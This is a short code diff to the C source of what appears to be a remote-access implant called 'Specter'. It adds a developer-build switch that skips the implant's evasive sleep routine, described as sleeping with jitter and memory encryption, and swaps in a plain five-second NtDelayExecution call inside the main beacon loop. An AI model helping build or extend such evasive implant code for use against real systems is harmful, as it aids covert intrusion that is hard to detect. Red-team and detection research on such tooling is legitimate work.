@@ -146,9 +146,14 @@ void implant_entry(PVOID param) {
         DEV_FAIL(14);
 
     /* ---- Step 6: Initialize sleep controller ---- */
+#ifdef SPECTER_DEV_BUILD
+    /* Skip sleep init in dev builds — use NtDelayExecution directly */
+    (void)0;
+#else
     status = sleep_init(&g_ctx);
     if (!NT_SUCCESS(status))
         DEV_FAIL(15);
+#endif
 
     /* ---- Step 7: Initialize communications engine ---- */
     status = comms_init(&g_ctx);
@@ -202,7 +207,16 @@ void implant_entry(PVOID param) {
         }
 
         /* Sleep with jitter and memory encryption */
+#ifdef SPECTER_DEV_BUILD
+        /* Dev build: simple 5-second NtDelayExecution sleep */
+        {
+            LARGE_INTEGER delay;
+            delay.QuadPart = -50000000LL; /* 5 seconds in 100ns units */
+            spec_NtDelayExecution(FALSE, &delay);
+        }
+#else
         sleep_cycle(&g_ctx);
+#endif
     }
 
     /* ---- Cleanup and exit ---- */
